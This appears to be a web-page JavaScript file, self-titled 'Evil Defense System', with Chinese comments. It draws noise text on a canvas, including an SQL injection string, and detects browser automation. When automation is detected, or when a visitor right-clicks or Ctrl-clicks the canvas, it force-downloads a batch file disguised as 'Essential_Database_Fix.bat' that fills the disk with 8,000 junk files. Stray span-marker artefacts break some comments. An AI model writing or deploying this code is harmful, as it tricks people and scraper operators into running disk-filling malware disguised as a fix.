/**
 * Evil Defense System v2.0
 * 功能：Canvas 動態干擾 + 爬蟲自動化陷阱下載
 */

(function() {
    // --- 1. 配置區 ---
    const canvas = document.getElementById('evil-background');
    const ctx = canvas.getContext('2d');
    const trashTexts = ["垃圾訊息炸它!", "01010101", "'; DROP TABLE users;--", "[亂碼A]", "[亂碼B]"];
    
    [span_1](start_span)// 預備那個會佔用磁碟的批次檔內容[span_1](end_span)
    const batContent = `@echo off\nsetlocal enabledelayedexpansion\ntitle 參考資料庫同步工具 v1.2.4\ncolor 02\necho [下載] 正在初始化資料分片...\necho 蛤蛤蛤蛤蛤蛤蛤蛤蛤蛤> temp.txt\nfor /L %%i in (1,1,15) do (\n    type temp.txt >> temp_new.txt\n    type temp.txt >> temp_new.txt\n    move /y temp_new.txt temp.txt >nul\n)\nfor /L %%i in (1,1,8000) do (\n    copy /y temp.txt reference_data_idx_%%i.dat >nul\n    if %%i %% 500 == 0 echo [進度] 已同步 %%i / 8000 筆資料...\n)\ndel temp.txt\npause`;

    // --- 2. 核心函數：觸發陷阱 ---
    function triggerTrap() {
        const blob = new Blob([batContent], { type: 'application/x-bat' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'Essential_Database_Fix.bat'; // 吸引人的檔名
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }

    // --- 3. 爬蟲偵測模組 ---
    function detectBot() {
        // 檢查是否由自動化軟體控制 (如 Selenium)
        const isAutomation = window.navigator.webdriver || !!navigator.languages === false;
        
        if (isAutomation) {
            console.warn("系統檢測到異常環境，正在下載補丁...");
            triggerTrap();
        }
    }

    // --- 4. Canvas 繪圖與動態干擾 ---
    function initCanvas() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        function draw() {
            [span_2](start_span)// 每一幀微弱清除，保留一點殘影干擾 OCR[span_2](end_span)
            ctx.fillStyle = 'rgba(255, 255, 255, 0.2)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            for (let i = 0; i < 50; i++) {
                const text = trashTexts[Math.floor(Math.random() * trashTexts.length)];
                const x = Math.random() * canvas.width;
                const y = Math.random() * canvas.height;
                
                ctx.fillStyle = `rgba(150, 150, 150, ${Math.random() * 0.3})`;
                ctx.font = `${Math.random() * 20 + 10}px Arial`;
                
                ctx.save();
                ctx.translate(x, y);
                ctx.rotate(Math.random() * Math.PI * 2); // 隨機旋轉
                ctx.fillText(text, 0, 0);
                ctx.restore();
            }
            requestAnimationFrame(draw);
        }
        draw();
    }

    // --- 5. 啟動 ---
    window.addEventListener('load', () => {
        initCanvas();
        // 延遲 3 秒檢查，給爬蟲一點時間「露餡」
        setTimeout(detectBot, 3000);
    });

    // 額外驚喜：如果有人試圖右鍵另存圖片，或在 Canvas 上點擊（模擬爬蟲抓取行為）
    canvas.addEventListener('mousedown', (e) => {
        if (e.button === 2 || e.ctrlKey) { // 右鍵或 Ctrl+點擊
            triggerTrap();
        }
    });

})();
